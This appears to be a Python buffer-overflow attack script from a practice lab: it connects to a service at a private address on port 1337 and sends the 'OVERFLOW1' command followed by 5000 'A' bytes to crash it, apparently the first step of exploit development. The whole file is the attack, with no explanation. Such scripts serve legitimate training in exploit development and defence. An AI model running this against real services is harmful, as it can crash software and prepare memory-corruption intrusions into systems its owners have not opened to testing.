#!/usr/bin/env python3

import socket

host, port = "10.10.209.4", 1337

command = b"OVERFLOW1 "

payload = b"".join([
	command,
	b"A" * 5000,
])

with socket.socket() as s:
	s.connect((host, port))
	# banner = s.recv(4096).decode("utf-8").strip()
	s.send(payload)